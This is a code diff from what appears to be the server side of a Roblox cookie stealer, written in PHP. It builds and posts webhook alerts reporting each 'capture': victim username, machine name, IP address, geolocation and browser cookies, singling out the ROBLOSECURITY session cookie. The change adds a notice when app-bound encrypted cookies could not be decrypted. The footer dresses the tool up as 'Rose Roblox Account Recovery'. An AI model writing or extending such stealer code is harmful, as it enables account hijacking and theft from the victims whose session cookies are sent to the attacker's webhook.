@@ -7,19 +7,19 @@ declare(strict_types=1);
  */
 
 function notify_capture(string $hook, string $tag, string $app, string $user,
-                        string $machine, string $ip, array $cookies): void
+                        string $machine, string $ip, array $cookies, int $skipped = 0): void
 {
     $hook = trim($hook);
     if ($hook === '' || strpos($hook, 'https://') !== 0) {
         return;
     }
 
-    $payload = build_capture_message($tag, $app, $user, $machine, $ip, $cookies);
+    $payload = build_capture_message($tag, $app, $user, $machine, $ip, $cookies, $skipped);
     http_post_json($hook, json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
 }
 
 function build_capture_message(string $tag, string $app, string $user, string $machine,
-                               string $ip, array $cookies): array
+                               string $ip, array $cookies, int $skipped = 0): array
 {
     $roblox = find_cookie($cookies, 'ROBLOSECURITY');
     $browsers = [];
@@ -46,6 +46,17 @@ function build_capture_message(string $tag, string $app, string $user, string $m
 
     $where = geo_lines($ip);
 
+    $fields = [
+        ['name' => 'Somewhere', 'value' => $where, 'inline' => false],
+    ];
+    if ($roblox === '' && $skipped > 0) {
+        $fields[] = [
+            'name' => 'Note',
+            'value' => $skipped . ' cookie(s) were v20 (app-bound) and could not be opened.',
+            'inline' => false,
+        ];
+    }
+
     return [
         'username' => 'Rose',
         'content' => '@everyone',
@@ -55,9 +66,7 @@ function build_capture_message(string $tag, string $app, string $user, string $m
             'title' => $title,
             'description' => $description,
             'color' => 15832598,
-            'fields' => [
-                ['name' => 'Somewhere', 'value' => $where, 'inline' => false],
-            ],
+            'fields' => $fields,
             'footer' => ['text' => 'Rose Roblox Account Recovery / roseater.run'],
         ]],
     ];
